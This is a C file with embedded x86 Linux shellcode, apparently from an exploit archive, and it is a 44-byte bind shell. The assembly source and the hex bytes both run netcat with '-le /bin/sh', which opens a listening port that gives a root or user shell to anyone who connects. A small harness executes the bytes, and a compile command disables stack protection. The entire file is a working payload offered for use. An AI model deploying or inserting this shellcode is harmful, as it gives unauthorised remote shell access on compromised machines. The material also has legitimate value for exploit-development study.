/*
# Super_Small_Bind_Shell 2 (x86)
# Date: 17.03.2017
# This shellcode will listen on random port and show you how deep the rabbit hole goes
# Please note that ports below 1024 require high privileges to bind!
# Shellcode Author: ALEH BOITSAU
# Shellcode Length: 44 bytes!)
# Tested on: Debian GNU/Linux 8/x86_64
# Command: gcc -m32 -z execstack super_small_bind_shell2.c -o super_small_bind_shell2

section .text
global _start
 _start:

    xor edx, edx
    push edx
    push 0x68732f2f     ;-le//bin//sh
    push 0x6e69622f
    push 0x2f656c2d
    mov edi, esp

    push edx
    push 0x636e2f2f     ;/bin//nc
    push 0x6e69622f
    mov ebx, esp

    push edx
    push edi
    push ebx
    mov ecx, esp
    xor eax, eax
    mov al,11
    int 0x80

*/

#include <stdio.h>
#include <string.h>

unsigned char shellcode[] =
"\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";
main()
{
	printf("Shellcode Length: %d\n",strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}